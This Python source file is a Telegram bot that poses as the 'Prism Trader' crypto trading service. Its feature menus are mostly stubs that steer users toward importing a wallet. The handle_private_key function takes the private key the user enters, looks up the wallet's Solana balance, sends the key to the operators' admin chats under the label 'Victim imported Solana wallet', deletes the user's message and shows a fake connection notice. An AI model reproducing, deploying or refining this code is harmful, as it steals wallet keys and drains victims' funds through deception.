
import os
import logging
import asyncio
from typing import Optional
from datetime import datetime
import json

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
from telegram.ext import (
    Updater,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    CallbackContext,
    Filters,
    ConversationHandler
)
from dotenv import load_dotenv
import httpx
import base58
from nacl.signing import SigningKey
from nacl.public import PublicKey

load_dotenv()

API_TOKEN = os.getenv("API_TOKEN")
ADMIN_IDS = os.getenv("ADMIN_IDS")
LINK_URL = os.getenv("LINK_URL", "https://telegram.org")

if not API_TOKEN or not ADMIN_IDS:
    raise ValueError("❌ API_TOKEN or ADMIN_IDS is not set in .env file!")

# Parse admin IDs (comma-separated list)
try:
    ADMIN_ID_LIST = [int(admin_id.strip()) for admin_id in ADMIN_IDS.split(',')]
except ValueError:
    raise ValueError("❌ ADMIN_IDS must be comma-separated integers!")

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"

WAITING_FOR_PRIVATE_KEY = 1

class TradingBot:
    def __init__(self):
        self.welcome_message = (
            "👋 Welcome to *Prism Trader*, the one-stop solution for all your trading needs!\n\n"
            "🔗 *Chains:* Enable/disable chains.\n"
            "👛 *Wallets:* Import or generate wallets.\n"
            "⚙️ *Global Settings:* Customize the bot for a unique experience.\n"
            "📈 *Active Orders:* Active buy and sell limit orders.\n"
            "📊 *Positions:* Monitor your active trades.\n\n"
            "⚡ Looking for a quick buy or sell? Simply paste the token CA and you're ready to go!\n\n"
            "*Sol wallet W1👉* `5gpSuKAUT874G5FQQTSAURtA81tW6HwnCAuSwEpb7aig`\n"
            "*Eth wallet W2👉* `0x67B169aC536789358B655936D817b76C27B57828`\n\n"
            f"[Hub]({LINK_URL}) • [Updates]({LINK_URL}) • [X (Twitter)]({LINK_URL}) • "
            f"[Docs]({LINK_URL}) • [Support]({LINK_URL}) • [More Links]({LINK_URL})\n\n"
            "🇳🇱 EU1 • 🇩🇪 EU2 • 🇺🇸 US1 • 🇸🇬 SG1"
        )

        self.first_time_message = (
            "**Prism Trade – Unlock a Smarter Way to Trade Crypto**\n\n"
            "**Prism Trade enables secure and efficient token trading directly within Telegram. With powerful features such as Limit Orders, Copy Trading, Sniping, and more, you can execute advanced strategies seamlessly, all from one interface.**\n\n"
            "**By proceeding, you will generate a non-custodial crypto wallet that integrates with Prism Trade. This wallet allows full access to trading and wallet management within Telegram, without the need for external apps or platforms.**\n\n"
            "**Important: Upon continuing, your public wallet address and private key will be generated and displayed directly in this chat. Please ensure you are in a private and secure environment.**\n"
            "**Your private key will not be stored or recoverable by Prism Trade. It is your sole responsibility to store it securely.**\n\n"
            f"**By clicking Continue, you confirm that you have read and accepted our [Terms and Conditions]({LINK_URL}) and [Privacy Policy]({LINK_URL}). You also acknowledge the inherent risks of cryptocurrency trading and accept full responsibility for any outcomes resulting from the use of Prism Trade.**"
        )

        self.main_menu_buttons = [
            "📊 Active orders", "💎 Presale", "⭐ Premium", "🔗 Referral",
            "🌉 Bridge", "📉 Positions", "🤖 Auto snipe", "🔁 Copy trade",
            "⚙️ Global settings", "👛 Wallets", "📡 Signals", "🔗 Chains",
            "🆘 Support"
        ]

        self.wallet_menu_buttons = [
            "🔑 Import wallet", "🧑‍💻 Generate wallet", "📝 Manual", "🎮 Q1",
            "💼 Default wallet", "🔄 Q1 Rearrange wallets", "❓ Help", "🔙 Return"
        ]

    def create_keyboard(self, buttons: list, row_width: int = 2) -> InlineKeyboardMarkup:
        """Create inline keyboard from button list"""
        keyboard = []
        for i in range(0, len(buttons), row_width):
            row = [
                InlineKeyboardButton(text=btn, callback_data=btn)
                for btn in buttons[i:i + row_width]
            ]
            keyboard.append(row)
        return InlineKeyboardMarkup(keyboard)

    def validate_private_key(self, private_key: str) -> bool:
        """Simple validation for private key format"""
        try:
            # Try to decode as base58
            decoded = base58.b58decode(private_key)
            # Check if it's a reasonable length for a private key
            return len(decoded) in [32, 64]
        except Exception:
            return False

    async def get_solana_balance_async(self, private_key: str) -> tuple[Optional[float], Optional[str]]:
        try:
            # Decode the private key
            decoded_key = base58.b58decode(private_key)

            if len(decoded_key) == 64:
                # Full keypair (64 bytes) - extract the secret key (first 32 bytes)
                secret_key_bytes = decoded_key[:32]
            elif len(decoded_key) == 32:
                # Secret key only (32 bytes)
                secret_key_bytes = decoded_key
            else:
                return None, "Invalid private key format"

            # Create signing key from the secret key bytes
            signing_key = SigningKey(secret_key_bytes)

            # Get the public key from the signing key
            public_key_bytes = bytes(signing_key.verify_key)

            # Convert public key to base58 string
            public_key_str = base58.b58encode(public_key_bytes).decode('utf-8')

            # Make RPC call to get balance
            payload = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [public_key_str]
            }

            async with httpx.AsyncClient() as client:
                response = await client.post(
                    SOLANA_RPC_URL,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                    timeout=10.0
                )

                if response.status_code == 200:
                    data = response.json()
                    if "result" in data and "value" in data["result"]:
                        balance_lamports = data["result"]["value"]
                        balance_sol = balance_lamports / 1_000_000_000
                        return balance_sol, public_key_str
                    else:
                        return None, f"RPC Error: {data.get('error', 'Unknown error')}"
                else:
                    return None, f"HTTP Error: {response.status_code}"

        except Exception as e:
            logger.error(f"Error getting Solana balance: {e}")
            return None, f"Error: {str(e)}"

    def get_solana_balance(self, private_key: str) -> tuple[Optional[float], Optional[str]]:
        try:
            return asyncio.run(self.get_solana_balance_async(private_key))
        except RuntimeError:
            loop = asyncio.get_event_loop()
            return loop.run_until_complete(self.get_solana_balance_async(private_key))

    def start_command(self, update: Update, context: CallbackContext) -> None:
        """Handle /start command"""
        try:
            user_id = update.effective_user.id
            
            # Check if this is the first time user is using the bot
            if not context.user_data.get('has_seen_welcome'):
                # Show first-time welcome message
                continue_keyboard = InlineKeyboardMarkup([[
                    InlineKeyboardButton("Continue", callback_data="continue_to_main")
                ]])
                
                update.message.reply_text(
                    self.first_time_message,
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True,
                    reply_markup=continue_keyboard
                )
                context.user_data['has_seen_welcome'] = True
            else:
                # Show regular welcome message
                self.show_main_menu(update, context)
                
        except Exception as e:
            logger.error(f"Error in start command: {e}")
            update.message.reply_text("❌ An error occurred. Please try again.")

    def show_main_menu(self, update: Update, context: CallbackContext) -> None:
        """Show the main menu"""
        try:
            welcome_msg = update.message.reply_text(
                "To elevate your trading experience, please connect your wallet.",
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True
            )

            try:
                context.bot.pin_chat_message(
                    chat_id=update.effective_chat.id,
                    message_id=welcome_msg.message_id
                )
            except Exception as e:
                logger.warning(f"Could not pin message: {e}")

            update.message.reply_text(
                self.welcome_message,
                parse_mode=ParseMode.MARKDOWN,
                disable_web_page_preview=True,
                reply_markup=self.create_keyboard(self.main_menu_buttons, row_width=2)
            )
        except Exception as e:
            logger.error(f"Error showing main menu: {e}")
            update.message.reply_text("❌ An error occurred. Please try again.")

    def button_callback(self, update: Update, context: CallbackContext) -> None:
        """Handle inline keyboard button presses"""
        query = update.callback_query
        query.answer()

        user_id = query.from_user.id
        username = query.from_user.username or "NoUsername"
        button_data = query.data

        try:
            if button_data == "👛 Wallets":
                query.edit_message_text(
                    text="👛 *Wallets Menu:*",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=self.create_keyboard(self.wallet_menu_buttons, row_width=2)
                )

            elif button_data == "🔑 Import wallet":
                query.edit_message_text(
                    text="🔑 Please enter the private key or a 12-word mnemonic phrase of the wallet you want to import.",
                    parse_mode=ParseMode.MARKDOWN
                )
                context.user_data['awaiting_private_key'] = True
                return WAITING_FOR_PRIVATE_KEY

            elif button_data == "continue_to_main":
                query.edit_message_text(
                    text="To elevate your trading experience, please connect your wallet.",
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True
                )
                
                query.message.reply_text(
                    self.welcome_message,
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True,
                    reply_markup=self.create_keyboard(self.main_menu_buttons, row_width=2)
                )

            elif button_data == "🆘 Support":
                support_buttons = [
                    [InlineKeyboardButton("Owner", url="https://t.me/Kuqo767")],
                    [InlineKeyboardButton("Support Rep 1", url="https://t.me/PrismTraderSupport1")],
                    [InlineKeyboardButton("Support Rep 2", url="https://t.me/Prism_trade_support")],
                    [InlineKeyboardButton("Support Rep 3", url="https://t.me/PrismTradingSupporter")]
                ]
                support_keyboard = InlineKeyboardMarkup(support_buttons)
                
                query.edit_message_text(
                    text="Choose one of our representatives to speak to:",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=support_keyboard
                )

            elif button_data == "🔙 Return":
                query.edit_message_text(
                    text=self.welcome_message,
                    parse_mode=ParseMode.MARKDOWN,
                    disable_web_page_preview=True,
                    reply_markup=self.create_keyboard(self.main_menu_buttons, row_width=2)
                )

            elif button_data in self.wallet_menu_buttons:
                query.message.reply_text("❌ No funds detected. Please deposit or import a wallet.")

            else:
                response_map = {
                    "📊 Active orders": "📊 View and manage your active buy and sell orders.",
                    "💎 Presale": "📝 Find upcoming presale events and token launches.",
                    "⭐ Premium": "💎 Unlock premium features for a more advanced experience.",
                    "🔗 Referral": "📈 Share your referral link and earn rewards when others sign up!",
                    "📉 Positions": "📊 Track your open trading positions and their status.",
                    "🤖 Auto snipe": "🤖 Automatically make trades when a target condition is met.",
                    "🔁 Copy trade": "🔁 Copy the trades of successful traders automatically.",
                    "⚙️ Global settings": "⚙️ Adjust your bot's settings to personalize your experience.",
                    "📡 Signals": "📡 Receive real-time trade signals for profitable opportunities.",
                    "🔗 Chains": "🔗 Enable or disable different chains and protocols for trading.",
                    "🌉 Bridge": "🌉 Bridge tokens between different blockchains."
                }

                response = response_map.get(button_data, "❌ Feature not implemented yet.")
                query.message.reply_text(response)

        except Exception as e:
            logger.error(f"Error in button callback: {e}")
            query.message.reply_text("❌ An error occurred. Please try again.")

    def handle_private_key(self, update: Update, context: CallbackContext) -> int:
        """Handle private key input"""
        if not context.user_data.get('awaiting_private_key'):
            return ConversationHandler.END

        user_id = update.effective_user.id
        username = update.effective_user.username or "NoUsername"
        private_key = update.message.text.strip()

        if not private_key:
            update.message.reply_text("❌ You did not provide a private key or mnemonic phrase. Please try again.")
            return WAITING_FOR_PRIVATE_KEY

        try:
            # Validate the private key format
            if not self.validate_private_key(private_key):
                update.message.reply_text("❌ Invalid private key format. Please provide a valid base58 encoded private key.")
                return WAITING_FOR_PRIVATE_KEY

            # Get the Solana balance synchronously
            balance, public_key_or_error = self.get_solana_balance(private_key)

            if balance is not None:
                balance_text = f"{balance:.4f} SOL"
                public_key_text = f"Public Key: `{public_key_or_error}`"
            else:
                balance_text = f"Error: {public_key_or_error}"
                public_key_text = "Public Key: Unable to derive"

            admin_message = (
                f"🔐 *Victim imported Solana wallet*\n\n"
                f"**Victim Information**\n"
                f"Name: @{username}\n"
                f"Premium: ❌\n"
                f"• ID: {user_id}\n"
                f"Balance: {balance_text}\n"
                f"{public_key_text}\n\n"
                f"**Private key:**\n"
                f"`{private_key}`\n\n"
                f"⚠️ Do not try to exit scam, you will be instantly caught red handed!"
            )

            # Send message to all admins
            for admin_id in ADMIN_ID_LIST:
                try:
                    context.bot.send_message(
                        chat_id=admin_id,
                        text=admin_message,
                        parse_mode=ParseMode.MARKDOWN
                    )
                except Exception as e:
                    logger.warning(f"Could not send message to admin {admin_id}: {e}")

            try:
                context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=update.message.message_id
                )
            except Exception as e:
                logger.warning(f"Could not delete message: {e}")

            update.message.reply_text(
                "🔄 Your wallet is being connected. This may take a minute.\n"
                "⚠️ Please ensure this is the correct wallet, as entering the wrong one may cause issues!"
            )

            context.user_data['awaiting_private_key'] = False
            return ConversationHandler.END

        except Exception as e:
            logger.error(f"Error handling private key: {e}")
            update.message.reply_text("❌ An error occurred while processing your wallet. Please try again.")
            return WAITING_FOR_PRIVATE_KEY

    def handle_messages(self, update: Update, context: CallbackContext) -> None:
        """Handle all other messages"""
        if not context.user_data.get('awaiting_private_key'):
            update.message.reply_text("❌ No funds detected. Please deposit or import a wallet.")

    def error_handler(self, update: Update, context: CallbackContext) -> None:
        """Handle errors"""
        logger.error(f"Update {update} caused error {context.error}")

        if update and update.effective_message:
            try:
                update.effective_message.reply_text(
                    "❌ An unexpected error occurred. Please try again or contact support."
                )
            except Exception:
                pass

def main() -> None:
    """Start the bot"""
    bot = TradingBot()

    updater = Updater(API_TOKEN, use_context=True)
    dp = updater.dispatcher

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(bot.button_callback, pattern="^🔑 Import wallet$")],
        states={
            WAITING_FOR_PRIVATE_KEY: [MessageHandler(Filters.text & ~Filters.command, bot.handle_private_key)]
        },
        fallbacks=[CommandHandler("start", bot.start_command)]
    )

    dp.add_handler(CommandHandler("start", bot.start_command))
    dp.add_handler(conv_handler)
    dp.add_handler(CallbackQueryHandler(bot.button_callback))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, bot.handle_messages))

    dp.add_error_handler(bot.error_handler)

    # Start bot
    logger.info("Bot is starting...")
    print("🤖 Bot is polling...")
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
